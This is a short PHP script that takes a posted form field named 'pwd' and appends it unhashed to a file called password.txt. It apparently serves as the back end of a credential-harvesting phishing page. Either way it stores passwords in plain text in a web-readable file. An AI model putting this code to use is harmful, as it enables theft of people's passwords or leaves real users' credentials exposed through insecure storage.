<?php
 $path = 'password.txt';
 if (isset($_POST['pwd'])) {
     $fh = fopen($path, "a+") or die("Unable to open file!");
     $string = $_POST['pwd'];
     fwrite($fh,$string);
     fclose($fh);
 }
 ?>
